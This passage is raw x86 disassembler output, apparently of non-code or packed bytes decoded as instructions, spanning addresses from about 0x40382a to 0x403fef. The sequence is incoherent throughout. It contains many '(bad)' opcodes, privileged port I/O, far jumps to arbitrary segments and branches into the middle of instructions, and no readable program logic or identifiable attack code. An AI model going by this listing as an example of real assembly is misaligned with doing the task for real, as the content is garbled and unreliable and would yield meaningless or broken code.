  40382a:	out    dx,eax
  40382b:	mov    ah,0x58
  40382d:	jg     0x4037b1
  40382f:	and    al,0x72
  403831:	sbb    al,0xeb
  403833:	push   0x2a
  403835:	adc    ah,BYTE PTR [ebx]
  403837:	sahf   
  403838:	sbb    cl,BYTE PTR [esi-0x26]
  40383b:	and    al,0xe8
  40383d:	add    esi,DWORD PTR [edx+ebp*2+0x38883c91]
  403844:	test   BYTE PTR [edi],cl
  403846:	fst    DWORD PTR [edi+0x1dc79725]
  40384c:	mov    ah,BYTE PTR [ebp-0x686ddae0]
  403852:	xor    dl,0xfb
  403855:	daa    
  403856:	push   ecx
  403857:	xchg   edi,eax
  403858:	jl     0x403846
  40385a:	lahf   
  40385b:	leave  
  40385c:	nop
  40385d:	rcr    BYTE PTR [esi+0x35076e5c],0x32
  403864:	ins    DWORD PTR es:[edi],dx
  403865:	pop    ebp
  403866:	add    BYTE PTR [ecx],bh
  403868:	add    al,BYTE PTR [edi]
  40386a:	and    ah,al
  40386c:	out    0xe2,al
  40386e:	fstp   DWORD PTR [edx+0x12]
  403871:	scas   al,BYTE PTR es:[edi]
  403872:	and    esp,esi
  403874:	mov    bh,BYTE PTR fs:[ecx-0x61]
  403878:	stos   BYTE PTR es:[edi],al
  403879:	inc    edi
  40387a:	ins    BYTE PTR es:[edi],dx
  40387b:	sbb    BYTE PTR [eax+eiz*4],dl
  40387e:	daa    
  40387f:	into   
  403880:	jle    0x40387c
  403882:	fidiv  WORD PTR [edi]
  403884:	test   eax,0xc90902d2
  403889:	mov    eax,ebp
  40388b:	pop    esi
  40388c:	(bad)  
  40388d:	jmp    0x99de:0xc243fb28
  403894:	xchg   ecx,eax
  403895:	cmp    eax,DWORD PTR [edi]
  403897:	int    0xfe
  403899:	clc    
  40389a:	or     eax,0xfb9fe710
  40389f:	scas   eax,DWORD PTR es:[edi]
  4038a0:	and    al,0x8b
  4038a2:	mov    ebp,0x151f3b73
  4038a7:	cmc    
  4038a8:	sub    DWORD PTR [ecx+0x49b1ea1b],edx
  4038ae:	add    al,0x0
  4038b0:	cmp    bl,BYTE PTR [esi-0x58]
  4038b3:	retf   0x1e3b
  4038b6:	inc    esi
  4038b7:	mov    al,ds:0x95380d2c
  4038bc:	pop    esp
  4038bd:	out    0xd9,eax
  4038bf:	dec    BYTE PTR [edx-0x6516f7fc]
  4038c5:	add    al,BYTE PTR [eax]
  4038c7:	add    dh,cl
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x53d405f3
  4038d5:	bound  ebx,QWORD PTR [esi+0x781d14e8]
  4038db:	js     0x4038db
  4038dd:	jle    0x403957
  4038df:	js     0x4038a3
  4038e1:	lahf   
  4038e2:	ja     0x403888
  4038e4:	aaa    
  4038e5:	sbb    al,0xdd
  4038e7:	dec    edi
  4038e8:	sbb    al,ah
  4038ea:	jle    0x4038b3
  4038ec:	mov    eax,0x7e1615cd
  4038f1:	out    dx,al
  4038f2:	mov    WORD PTR ds:0xbc634293,cs
  4038f8:	(bad)  
  4038f9:	xor    al,cl
  4038fb:	repnz adc BYTE PTR [esi],dh
  4038fe:	mov    edi,0x8f7cdc5
  403903:	add    BYTE PTR [ebx-0x29],ch
  403906:	push   0xca8dccdc
  40390b:	inc    ebx
  40390c:	cld    
  40390d:	inc    ebp
  40390e:	(bad)  
  40390f:	pop    edx
  403910:	das    
  403911:	push   edi
  403912:	push   esi
  403913:	aaa    
  403914:	cld    
  403915:	sub    DWORD PTR [edi+0x57ca9b70],edi
  40391b:	inc    ebp
  40391c:	sti    
  40391d:	mov    bl,0x5a
  40391f:	stos   DWORD PTR es:[edi],eax
  403920:	sub    BYTE PTR [ecx+0x254dd187],ch
  403926:	cs pop ebx
  403928:	call   0x8b95a61f
  40392d:	pop    ds
  40392e:	addr16 aad 0x42
  403931:	jle    0x403929
  403933:	xchg   esi,eax
  403934:	add    eax,DWORD PTR [eax-0x1e91c84c]
  40393a:	in     al,dx
  40393b:	fadd   QWORD PTR [eax+esi*1+0x6557951e]
  403942:	fadd   st,st(7)
  403944:	(bad)  
  403945:	daa    
  403946:	repnz scas eax,DWORD PTR es:[edi]
  403948:	in     eax,0x3c
  40394a:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40394c:	dec    edi
  40394d:	xlat   BYTE PTR ds:[ebx]
  40394e:	pop    es
  40394f:	jo     0x40396e
  403951:	push   ebp
  403952:	idiv   BYTE PTR [ebp+0xc]
  403955:	cmp    DWORD PTR [esi-0x3e485631],ebx
  40395b:	pop    edi
  40395c:	ret    0xef9
  40395f:	int    0xfe
  403961:	leave  
  403962:	(bad)  
  403963:	cmc    
  403964:	in     eax,dx
  403965:	xchg   ecx,eax
  403966:	lahf   
  403967:	push   edx
  403968:	jmp    0xdbcb:0x47be887
  40396f:	inc    esp
  403970:	inc    eax
  403971:	pop    ds
  403972:	jl     0x40398d
  403974:	cmp    DWORD PTR [esi*1+0x3f72715c],ebp
  40397b:	cdq    
  40397c:	mov    ah,0x7b
  40397e:	jge    0x4039df
  403980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403981:	in     al,0x76
  403983:	push   es
  403984:	bound  edi,QWORD PTR [edx-0x67993608]
  40398a:	(bad)  
  40398b:	mov    ah,0x33
  40398d:	test   al,0x3c
  40398f:	push   esp
  403990:	imul   ebx,DWORD PTR [edx-0x790ad970],0xbe9a5c67
  40399a:	pop    es
  40399b:	add    ecx,DWORD PTR ds:0xee3c89a5
  4039a1:	dec    eax
  4039a2:	fisttp QWORD PTR [edx+edx*8+0x5da440c1]
  4039a9:	mov    ebx,edi
  4039ab:	dec    edi
  4039ac:	sbb    al,0x1b
  4039ae:	mov    edx,0x5e9528ef
  4039b3:	aad    0x28
  4039b5:	pop    esi
  4039b6:	pop    ebx
  4039b7:	stc    
  4039b8:	jle    0x403951
  4039ba:	ret    0xc997
  4039bd:	enter  0x93f6,0xe6
  4039c1:	cmc    
  4039c2:	retf   
  4039c3:	adc    DWORD PTR [edi],0x5b
  4039c6:	test   DWORD PTR [edi],eax
  4039c8:	scas   al,BYTE PTR es:[edi]
  4039c9:	cmc    
  4039ca:	loopne 0x403a1c
  4039cc:	mov    ah,al
  4039ce:	mov    ds:0x4ec3ac47,eax
  4039d3:	adc    al,BYTE PTR [ebx-0x7a804b53]
  4039d9:	ja     0x9144ec70
  4039df:	pop    es
  4039e0:	adc    edx,edx
  4039e2:	mov    esp,0xbcc762ec
  4039e7:	jg     0x4039d2
  4039e9:	test   eax,0xbdbeab9c
  4039ee:	cld    
  4039ef:	inc    ecx
  4039f0:	imul   DWORD PTR ds:0x6709c062
  4039f6:	sub    esi,DWORD PTR [edx]
  4039f8:	xchg   ebp,ebx
  4039fa:	mov    cl,0xe0
  4039fc:	sub    esp,DWORD PTR [ecx]
  4039fe:	lods   al,BYTE PTR ds:[esi]
  403a00:	out    0xb3,eax
  403a02:	repz das 
  403a04:	or     ecx,ebx
  403a06:	push   ebp
  403a07:	aam    0x79
  403a09:	jp     0x4039f0
  403a0b:	test   al,0x65
  403a0d:	sub    BYTE PTR [edi+0x57],bh
  403a10:	and    eax,0x75926a1
  403a15:	cs test al,0x1b
  403a18:	push   edi
  403a19:	cmc    
  403a1a:	out    dx,al
  403a1b:	jle    0x403a56
  403a1d:	jb     0x4039ca
  403a1f:	xchg   edi,eax
  403a20:	mov    dh,0x6e
  403a22:	daa    
  403a23:	inc    ebp
  403a24:	stos   BYTE PTR es:[edi],al
  403a25:	loope  0x403a34
  403a27:	nop
  403a28:	pop    esi
  403a29:	xchg   esi,eax
  403a2a:	(bad)  
  403a2b:	psubb  mm7,QWORD PTR [edx+ebx*4+0x28]
  403a30:	mov    eax,ds:0x130cffc6
  403a35:	sub    esp,ebp
  403a37:	and    eax,0x275d2e29
  403a3c:	sbb    al,0xe8
  403a3e:	and    DWORD PTR [eax],edi
  403a40:	(bad)  
  403a41:	in     eax,0xa
  403a43:	dec    edi
  403a44:	sub    ebx,DWORD PTR [eax+0x24307c2c]
  403a4a:	(bad)  
  403a4b:	xchg   ebp,eax
  403a4c:	outs   dx,DWORD PTR ds:[esi]
  403a4d:	repnz add eax,0x3b65de0e
  403a53:	mov    esp,es
  403a55:	dec    ebp
  403a56:	dec    ecx
  403a57:	or     cl,BYTE PTR [eax]
  403a59:	(bad)  
  403a5a:	push   ss
  403a5b:	inc    edx
  403a5c:	sbb    ebx,DWORD PTR [ebx-0x67]
  403a5f:	push   ebx
  403a60:	retf   
  403a61:	push   ss
  403a62:	(bad)
  403a66:	(bad)  
  403a67:	cmc    
  403a68:	nop
  403a69:	std    
  403a6a:	dec    esp
  403a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a6c:	sub    al,0xea
  403a6e:	loop   0x403a57
  403a70:	add    eax,0xefafcee2
  403a75:	xor    cl,0x81
  403a78:	call   0xacec86d0
  403a7d:	pop    es
  403a7e:	icebp  
  403a7f:	outs   dx,DWORD PTR ds:[esi]
  403a80:	pop    ebp
  403a81:	je     0x403a40
  403a83:	or     bl,bl
  403a85:	inc    esi
  403a86:	pop    edx
  403a87:	push   edx
  403a88:	mov    esp,0xc1ebec65
  403a8d:	jle    0x403a2a
  403a8f:	ficom  WORD PTR [edx-0x4bc285c5]
  403a95:	dec    edx
  403a96:	jne    0x403a91
  403a98:	imul   edi
  403a9a:	loop   0x403ac2
  403a9c:	test   al,0x3f
  403a9e:	sub    DWORD PTR [ebx],edx
  403aa0:	sub    dl,al
  403aa2:	repz mov esp,0x10e10b9c
  403aa8:	or     BYTE PTR [edi+0x199daf98],dh
  403aae:	popa   
  403aaf:	mov    ecx,0xd9da5a7a
  403ab4:	lods   al,BYTE PTR ds:[esi]
  403ab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ab6:	xor    al,0xcd
  403ab8:	ficomp WORD PTR [ecx]
  403aba:	pop    ebp
  403abb:	icebp  
  403abc:	jg     0x403a60
  403abe:	add    eax,0xba0031c
  403ac3:	jmp    0x349c:0xfd3ed50
  403aca:	leave  
  403acb:	repnz pop ds
  403acd:	test   BYTE PTR [eax],dh
  403acf:	cwde   
  403ad0:	stos   BYTE PTR es:[edi],al
  403ad1:	xor    esi,edi
  403ad3:	in     al,dx
  403ad4:	mov    edx,0x4ae3daf3
  403ad9:	xchg   edx,eax
  403ada:	jg     0x403a8c
  403adc:	xchg   ebp,eax
  403add:	jnp    0x403ab8
  403adf:	cs fwait
  403ae1:	mov    esi,0x7dc30cc7
  403ae6:	xor    al,0xf9
  403ae8:	add    DWORD PTR [edi+0x28],0xffffff82
  403aec:	dec    ebp
  403aed:	in     al,0x51
  403aef:	aam    0x8
  403af1:	sub    eax,0x3fd8801f
  403af6:	xchg   ecx,eax
  403af7:	jg     0x403a7a
  403af9:	pop    edi
  403afa:	retf   0x1fc
  403afd:	xchg   esi,eax
  403afe:	shl    BYTE PTR [esp+eax*2+0x1],0x5a
  403b03:	bound  ebx,QWORD PTR [ecx+0x7c]
  403b06:	jb     0x403b68
  403b08:	xor    ch,BYTE PTR [ebx-0x1e069b87]
  403b0e:	loopne 0x403b01
  403b10:	dec    esi
  403b11:	sbb    BYTE PTR [eiz*1-0x634ac3d0],dh
  403b18:	int3   
  403b19:	lahf   
  403b1a:	push   edx
  403b1b:	mov    ch,0x1c
  403b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b1e:	fisttp WORD PTR [ebx-0x54]
  403b21:	imul   ebx,edi,0xeae2013d
  403b27:	cdq    
  403b28:	stos   DWORD PTR es:[edi],eax
  403b29:	jae    0x403aac
  403b2b:	aad    0x3b
  403b2d:	add    DWORD PTR [edi-0xd],ebx
  403b30:	cmp    al,0xd2
  403b32:	push   ecx
  403b33:	xor    BYTE PTR [eax-0x4a],ah
  403b36:	jne    0x403b87
  403b38:	jmp    0x91c6:0x2d6938bd
  403b3f:	popa   
  403b40:	jmp    0xf74b:0x31854faa
  403b47:	dec    esp
  403b48:	jg     0x403b9a
  403b4a:	dec    eax
  403b4b:	push   ds
  403b4c:	cmp    al,0x89
  403b4e:	stc    
  403b4f:	into   
  403b50:	and    eax,0x6a24d9ad
  403b55:	sub    bl,BYTE PTR [edx]
  403b57:	icebp  
  403b58:	pop    ebx
  403b59:	ss mov ah,bh
  403b5c:	cmp    DWORD PTR [edx-0x3ca30f67],0x43343b04
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	inc    esp
  403b80:	imul   eax,DWORD PTR [edx+ebx*4-0x66],0xfe787823
  403b88:	jle    0x403c02
  403b8a:	js     0x403ba0
  403b8c:	test   BYTE PTR [eax-0x1baf4f37],ah
  403b92:	cmp    DWORD PTR [edx],edx
  403b94:	shl    BYTE PTR [edx-0x6d11cc82],cl
  403b9a:	out    0x20,al
  403b9c:	popa   
  403b9d:	scas   eax,DWORD PTR es:[edi]
  403b9e:	nop
  403b9f:	mov    al,ds:0x2978546e
  403ba4:	dec    edx
  403ba5:	cli    
  403ba6:	test   BYTE PTR [ebp+0x742335a5],0xa8
  403bad:	sub    BYTE PTR [edx],bl
  403baf:	test   DWORD PTR [esi+ebp*1+0x723fef11],edi
  403bb6:	push   ebp
  403bb7:	sub    BYTE PTR [edi],dl
  403bb9:	inc    edx
  403bba:	icebp  
  403bbb:	sub    ah,ah
  403bbd:	cmp    al,0x6e
  403bbf:	gs cwde 
  403bc1:	mov    es,ebp
  403bc3:	mov    dl,0xdb
  403bc5:	mov    WORD PTR [ecx+0xe],cs
  403bc8:	or     bh,al
  403bca:	xor    eax,0xb979b8e3
  403bcf:	push   es
  403bd0:	les    edi,FWORD PTR [edi+0x3114ef6e]
  403bd6:	out    dx,al
  403bd7:	sar    DWORD PTR [eax+0x55],cl
  403bda:	popf   
  403bdb:	dec    edi
  403bdc:	call   0xf08fad4c
  403be1:	mov    ds:0xcfd67c5d,al
  403be6:	push   ebx
  403be7:	popf   
  403be8:	(bad)  
  403be9:	jae    0x403c66
  403beb:	mov    ds:0x635c2895,eax
  403bf0:	aas    
  403bf1:	sbb    al,0xfe
  403bf3:	adc    eax,0xffffffd5
  403bf6:	(bad)  
  403bf7:	push   ebp
  403bf8:	inc    ecx
  403bf9:	stos   DWORD PTR es:[edi],eax
  403bfa:	and    ecx,esi
  403bfc:	adc    eax,0xc733a6d4
  403c01:	fdiv   st,st(1)
  403c03:	jmp    0x4c46ddb2
  403c08:	out    dx,al
  403c09:	adc    dh,BYTE PTR [ecx-0x63]
  403c0c:	imul   ebx,edx,0xe64ed00d
  403c12:	dec    edi
  403c13:	jmp    0x403bdb
  403c15:	mov    ecx,0xfcdda111
  403c1a:	bound  esi,QWORD PTR [edi+0x5cd0fad1]
  403c20:	sub    BYTE PTR [edi+0x7a816b52],ah
  403c26:	and    eax,0x66319a37
  403c2b:	mov    ebp,0x9584b0e0
  403c30:	xchg   al,dl
  403c32:	les    ecx,FWORD PTR [esi+edx*8]
  403c35:	fmul   DWORD PTR [eax]
  403c37:	jo     0x403bca
  403c39:	cmc    
  403c3a:	mov    dl,0x67
  403c3c:	sub    edx,DWORD PTR [ebp-0xc]
  403c3f:	test   eax,0x91d01dd6
  403c44:	repnz add BYTE PTR [ecx-0xf],0x8e
  403c49:	and    dl,ch
  403c4b:	retf   
  403c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c4d:	ds test ebp,edx
  403c50:	outs   dx,DWORD PTR ds:[esi]
  403c51:	push   cs
  403c52:	xor    eax,0x45c0581a
  403c57:	out    dx,eax
  403c58:	pusha  
  403c59:	inc    DWORD PTR [ecx+ebp*2-0x5799aab1]
  403c60:	aad    0x60
  403c62:	push   edx
  403c63:	adc    BYTE PTR [ecx],dh
  403c65:	js     0x403c20
  403c67:	mov    al,ds:0x9a4a06ad
  403c6c:	sbb    DWORD PTR [ebx],ebp
  403c6e:	cwde   
  403c6f:	xchg   DWORD PTR [esp+edi*4],ebx
  403c72:	or     DWORD PTR [ecx+eiz*4+0x7230229d],ebp
  403c79:	adc    eax,0x52fc75cd
  403c7e:	pop    cx
  403c80:	pop    ebx
  403c81:	mov    cl,0xbc
  403c83:	add    BYTE PTR [ebx*1+0x1470234d],dl
  403c8a:	mov    DWORD PTR [ebx],ebp
  403c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c8d:	xchg   edi,eax
  403c8e:	(bad)  
  403c8f:	lock inc ecx
  403c91:	adc    al,0xe3
  403c93:	cs pop edx
  403c95:	js     0x403ca4
  403c97:	add    BYTE PTR [edi-0x5325a87b],ch
  403c9d:	cwde   
  403c9e:	std    
  403c9f:	push   esi
  403ca0:	mov    ecx,DWORD PTR [edx-0x4e3e19c1]
  403ca6:	xor    al,0xa6
  403ca8:	fst    DWORD PTR [ecx-0x6c]
  403cab:	xor    BYTE PTR [eax+esi*4-0x4b],ch
  403caf:	push   0x20
  403cb1:	sti    
  403cb2:	xchg   edx,eax
  403cb3:	cmp    eax,DWORD PTR [edx]
  403cb5:	add    eax,0x8c452c9a
  403cba:	dec    ebx
  403cbb:	sbb    esi,esp
  403cbd:	js     0x403c4c
  403cbf:	js     0x403cc7
  403cc1:	sbb    esi,DWORD PTR [edi]
  403cc3:	jp     0x403cc2
  403cc5:	ss scas al,BYTE PTR es:[edi]
  403cc7:	push   esi
  403cc8:	(bad)
  403ccc:	fisttp WORD PTR [ecx-0x46]
  403ccf:	(bad)  
  403cd0:	lods   al,BYTE PTR ds:[esi]
  403cd1:	fisttp DWORD PTR [ebp+0x1a]
  403cd4:	dec    ecx
  403cd5:	pusha  
  403cd6:	and    dh,BYTE PTR [esi]
  403cd8:	cs add eax,ebx
  403cdb:	xchg   ebx,eax
  403cdc:	in     eax,0xf1
  403cde:	push   cs
  403cdf:	push   eax
  403ce0:	xchg   ebp,eax
  403ce1:	push   cs
  403ce2:	repnz (bad) 
  403ce4:	and    eax,0x5be67542
  403ce9:	jnp    0x403cf6
  403ceb:	sub    eax,0x9b840119
  403cf0:	fwait
  403cf1:	mov    esi,0x630ba807
  403cf6:	idiv   DWORD PTR [ebx-0x12363bcf]
  403cfc:	dec    eax
  403cfd:	fs fcomip st,st(3)
  403d00:	xor    DWORD PTR [ebx+esi*4],edi
  403d03:	mov    dl,0x5d
  403d05:	xor    bl,ch
  403d07:	cwde   
  403d08:	add    al,0x79
  403d0a:	push   0xffffffc0
  403d0c:	or     bl,al
  403d0e:	mov    ch,BYTE PTR [ebx-0x5f2d6b98]
  403d14:	into   
  403d15:	test   bh,dl
  403d17:	iret   
  403d18:	sbb    bl,ah
  403d1a:	loopne 0x403d5f
  403d1c:	pushf  
  403d1d:	pop    ss
  403d1e:	mov    ds:0x1ff9dde4,al
  403d23:	in     eax,0x6c
  403d25:	mov    edi,0x5bd0ecc1
  403d2a:	outs   dx,BYTE PTR ds:[esi]
  403d2b:	sub    ebx,edx
  403d2d:	aas    
  403d2e:	(bad)  
  403d2f:	ins    DWORD PTR es:[di],dx
  403d31:	cld    
  403d32:	add    eax,0x6fc6cb2f
  403d37:	cmp    esi,DWORD PTR [esp+esi*8+0x767c327]
  403d3e:	out    dx,al
  403d3f:	(bad)  
  403d40:	push   0x9
  403d42:	ja     0x403ce2
  403d44:	repnz add ah,BYTE PTR [ecx+edx*2]
  403d48:	jnp    0x403daa
  403d4a:	or     esp,DWORD PTR [edi]
  403d4c:	pusha  
  403d4d:	stc    
  403d4e:	popa   
  403d4f:	pop    ebp
  403d50:	xchg   BYTE PTR [ecx],dl
  403d52:	ins    DWORD PTR es:[edi],dx
  403d53:	cld    
  403d54:	sti    
  403d55:	cmc    
  403d56:	lods   eax,DWORD PTR ds:[esi]
  403d57:	or     cl,bl
  403d59:	mov    WORD PTR [ebp+0x12],?
  403d5c:	pop    es
  403d5d:	gs jmp 0x14c39ec
  403d63:	xchg   BYTE PTR [ecx+eiz*2+0x7cf62e99],dh
  403d6a:	mov    al,0x34
  403d6c:	dec    ebx
  403d6d:	and    edx,ebx
  403d6f:	call   0x4b4f09ea
  403d74:	sub    al,0x92
  403d76:	fist   WORD PTR [edx-0x3e8a60c0]
  403d7c:	add    eax,0x33d91ad6
  403d81:	pop    edx
  403d82:	push   ss
  403d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d84:	jb     0x403d44
  403d86:	cdq    
  403d87:	add    al,0xbe
  403d89:	push   ebp
  403d8a:	mov    ah,0xe4
  403d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d8d:	pusha  
  403d8e:	cwde   
  403d8f:	add    ebx,0xffffffc0
  403d92:	lods   eax,DWORD PTR ds:[esi]
  403d93:	cmp    bl,BYTE PTR [edx+0x5ad2e408]
  403d99:	addr16 lahf 
  403d9b:	jae    0x403d90
  403d9d:	ds inc ecx
  403d9f:	dec    ecx
  403da0:	add    dh,dl
  403da2:	mov    ds:0x2355c662,eax
  403da7:	bnd jg 0x403daf
  403daa:	fs pusha 
  403dac:	fisub  WORD PTR [ebx-0x7e67fa23]
  403db2:	xlat   BYTE PTR ds:[ebx]
  403db3:	cli    
  403db4:	jnp    0x403dbc
  403db6:	inc    ecx
  403db7:	lods   eax,DWORD PTR ds:[esi]
  403db8:	push   eax
  403db9:	push   ebx
  403dba:	and    cl,bh
  403dbc:	ss jns 0x403d6e
  403dbf:	lea    ebp,[esi-0xb]
  403dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dc3:	icebp  
  403dc4:	pop    edx
  403dc5:	jbe    0x403d6c
  403dc7:	xchg   BYTE PTR [esi],dh
  403dc9:	clc    
  403dca:	in     al,0xe0
  403dcc:	jl     0x403e4d
  403dce:	dec    edi
  403dcf:	push   0xffffff93
  403dd1:	add    BYTE PTR [edi+0x23],bh
  403dd4:	imul   ecx,DWORD PTR [esi-0x6a87df48],0xfac62d09
  403dde:	hlt    
  403ddf:	in     eax,dx
  403de0:	(bad)  
  403de1:	push   esi
  403de2:	retf   0xa065
  403de5:	jb     0x403e61
  403de7:	pop    eax
  403de8:	mov    dh,0x25
  403dea:	mov    esi,0x8c4b2e03
  403def:	js     0x403da2
  403df1:	fadd   DWORD PTR [eax+0x6d]
  403df4:	ja     0x403e3f
  403df6:	shr    BYTE PTR [ecx],1
  403df8:	sahf   
  403df9:	jb     0x403e79
  403dfb:	iret   
  403dfc:	shl    BYTE PTR [ebx-0x53329d2d],cl
  403e02:	xchg   BYTE PTR [esi+ebx*1+0x12cfdd00],dh
  403e09:	and    eax,0x8bc5da7c
  403e0e:	inc    ebp
  403e0f:	or     BYTE PTR [ebx-0x39cc07b3],cl
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0x17dd8593
  403e30:	xor    cl,al
  403e32:	dec    eax
  403e33:	sbb    BYTE PTR [eax],ah
  403e35:	js     0x403eaf
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403e28
  403e3c:	sar    BYTE PTR [ecx+0x46],cl
  403e3f:	adc    eax,DWORD PTR [ebx+0x7929e23e]
  403e45:	and    BYTE PTR [esi+0x6488936c],al
  403e4b:	mul    BYTE PTR [ebp+0x368c8591]
  403e51:	in     al,dx
  403e52:	push   ds
  403e53:	mov    DWORD PTR [ebp+0x5e],ebp
  403e56:	xchg   esp,eax
  403e57:	xchg   ebx,eax
  403e58:	test   eax,0xea9c5b2a
  403e5d:	dec    edi
  403e5e:	(bad)  
  403e5f:	rol    DWORD PTR [edx+edi*4+0x4b219e5a],cl
  403e66:	lock (bad) 
  403e68:	or     eax,0x448d50dd
  403e6d:	adc    eax,0x37b6d591
  403e72:	sbb    eax,0x5fc70012
  403e77:	sbb    ecx,eax
  403e79:	pop    edi
  403e7a:	(bad)  ds:0xf086ee97
  403e80:	imul   edi,edx,0xffffffaa
  403e83:	mov    cl,0xbd
  403e85:	sbb    dh,BYTE PTR [esi+0x3d]
  403e88:	jns    0x403ea2
  403e8a:	ins    BYTE PTR es:[edi],dx
  403e8b:	mov    ecx,0x54a56984
  403e90:	push   eax
  403e91:	popa   
  403e92:	rcr    DWORD PTR [ecx+edi*4-0x4054b532],cl
  403e99:	test   eax,0x5dc69652
  403e9e:	lahf   
  403e9f:	cdq    
  403ea0:	adc    al,0x15
  403ea2:	ds stos DWORD PTR es:[edi],eax
  403ea4:	rcl    al,1
  403ea6:	aam    0x8
  403ea8:	jae    0x403efc
  403eaa:	stos   BYTE PTR es:[edi],al
  403eab:	pusha  
  403eac:	call   0x3e5e:0x17d4a614
  403eb3:	pop    edi
  403eb4:	xchg   esp,eax
  403eb5:	xlat   BYTE PTR ds:[ebx]
  403eb6:	adc    al,0x81
  403eb8:	fild   QWORD PTR ds:[esi]
  403ebb:	adc    eax,0x92e1c0d4
  403ec0:	ins    DWORD PTR es:[edi],dx
  403ec1:	xchg   BYTE PTR [ecx+0x403783a6],bh
  403ec7:	fcomp  DWORD PTR [ebx]
  403ec9:	frstor [edx+esi*1-0x5d]
  403ecd:	mov    edi,0xd88af9e8
  403ed2:	hlt    
  403ed3:	jno    0x403e56
  403ed5:	aam    0xb8
  403ed7:	xor    cl,BYTE PTR [edx-0x60]
  403eda:	and    eax,0x1b8902be
  403edf:	rol    DWORD PTR ds:0xb6d892,1
  403ee5:	inc    ebp
  403ee6:	mov    al,0x6d
  403ee8:	inc    ebp
  403ee9:	in     al,0x4a
  403eeb:	sbb    al,0x9c
  403eed:	or     BYTE PTR [ecx+0xe],bl
  403ef0:	pushf  
  403ef1:	in     al,dx
  403ef2:	xor    ah,BYTE PTR [ebp-0x6fed2a51]
  403ef8:	mov    dh,0xe1
  403efa:	mov    ebx,0x9ed5cba7
  403eff:	xchg   ecx,eax
  403f00:	add    bh,BYTE PTR [esi-0x6a]
  403f03:	pop    es
  403f04:	add    dl,ah
  403f06:	add    DWORD PTR [edi+0x50d24865],ebp
  403f0c:	xchg   BYTE PTR [eax+0x180c388f],ah
  403f12:	xchg   ebp,eax
  403f13:	push   ds
  403f14:	ret    
  403f15:	dec    ebp
  403f16:	dec    eax
  403f17:	jae    0x403f68
  403f19:	ret    0x3e8e
  403f1c:	aas    
  403f1d:	xor    esp,DWORD PTR [bp+si+0x59]
  403f21:	lock or al,0x98
  403f24:	pop    ecx
  403f25:	add    dl,BYTE PTR [ebx+0xc]
  403f28:	jmp    0xdba5c05d
  403f2d:	adc    edi,eax
  403f2f:	mov    dl,0x8
  403f31:	jge    0x403f61
  403f33:	inc    eax
  403f34:	arpl   si,si
  403f36:	out    0xa9,al
  403f38:	sub    esp,DWORD PTR [eax]
  403f3a:	mov    cl,0x46
  403f3c:	retf   0xe047
  403f3f:	mov    edx,esp
  403f41:	mov    DWORD PTR [ebp-0x14],edi
  403f44:	in     eax,dx
  403f45:	xor    BYTE PTR [esi+0x12d96f0c],dl
  403f4b:	mov    edi,0xbf265bb9
  403f50:	mov    bl,0xb7
  403f52:	loope  0x403f2a
  403f54:	aad    0x89
  403f56:	fidiv  DWORD PTR [ebx]
  403f58:	outs   dx,DWORD PTR ds:[esi]
  403f59:	and    al,0x3e
  403f5b:	add    ebp,DWORD PTR [edi+0x2390608d]
  403f61:	dec    esi
  403f62:	arpl   WORD PTR [ebx+0x6c5ed780],sp
  403f68:	mov    edx,0x940d2a91
  403f6d:	idiv   ch
  403f6f:	sti    
  403f70:	cmp    al,BYTE PTR [ecx]
  403f72:	jmp    0x59ae:0x1d1e60a3
  403f79:	scas   eax,DWORD PTR es:[edi]
  403f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f7b:	sahf   
  403f7c:	mov    dh,bh
  403f7e:	out    0xde,al
  403f80:	adc    esi,DWORD PTR [ecx]
  403f82:	push   0xe
  403f84:	rcr    DWORD PTR [eax+0x28],cl
  403f87:	inc    ebp
  403f88:	lds    edx,FWORD PTR [esi+0x21cae220]
  403f8e:	mov    eax,ds:0x1b7895
  403f93:	mov    ch,BYTE PTR [edx+eax*4-0x7b802e9f]
  403f9a:	outs   dx,DWORD PTR ds:[esi]
  403f9b:	adc    al,BYTE PTR [esi]
  403f9d:	outs   dx,DWORD PTR ds:[esi]
  403f9e:	in     eax,dx
  403f9f:	sub    ch,BYTE PTR [eax-0x54b45766]
  403fa5:	jbe    0x403f7f
  403fa7:	mov    al,0x5
  403fa9:	sbb    BYTE PTR ds:0xe17b3ad3,bh
  403faf:	xor    BYTE PTR [eax],dl
  403fb1:	(bad)  
  403fb3:	ret    0x6c40
  403fb6:	dec    esi
  403fb7:	sub    DWORD PTR [edi-0x377c4747],0xffffffc1
  403fbe:	and    al,0x65
  403fc0:	push   0x30
  403fc2:	xor    eax,0xc56e3eee
  403fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fc8:	xor    BYTE PTR [ecx+0x55],dh
  403fcb:	test   eax,0x4cf11af4
  403fd0:	out    dx,al
  403fd1:	add    al,0x34
  403fd3:	(bad)  
  403fd4:	cmp    DWORD PTR [edi-0xe],esi
  403fd7:	test   bl,bl
  403fd9:	fcom   st(7)
  403fdb:	jae    0x403fc7
  403fdd:	and    ah,al
  403fdf:	pop    ebx
  403fe0:	aad    0xac
  403fe2:	imul   eax,eax,0x6d92528d
  403fe8:	call   0xb83e65c
  403fed:	sbb    bl,ah
  403fef:	mov    ebx,0x2e03b272
